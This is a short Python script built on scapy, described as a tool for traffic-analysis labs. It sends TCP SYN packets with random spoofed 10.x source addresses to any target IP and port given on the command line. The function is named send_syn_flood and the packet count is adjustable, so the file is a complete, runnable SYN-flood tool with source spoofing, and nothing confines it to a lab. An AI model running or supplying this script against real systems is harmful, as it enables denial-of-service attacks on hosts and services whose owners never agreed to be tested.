#!/usr/bin/env python3

import argparse
import random

from scapy.all import IP, TCP, send


def random_source_ip() -> str:
    return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"


def send_syn_flood(target_ip: str, target_port: int, num_packets: int) -> None:
    for _ in range(num_packets):
        packet = IP(src=random_source_ip(), dst=target_ip) / TCP(
            sport=random.randint(1024, 65535),
            dport=target_port,
            flags="S",
        )
        send(packet, verbose=0)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Send TCP SYN packets to a target for traffic-analysis labs.",
    )
    parser.add_argument("target_ip", help="Destination IPv4 address")
    parser.add_argument("--port", type=int, default=80, help="Destination TCP port (default: 80)")
    parser.add_argument(
        "--count",
        type=int,
        default=10,
        help="Number of SYN packets to send (default: 10)",
    )

    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    send_syn_flood(args.target_ip, args.port, args.count)
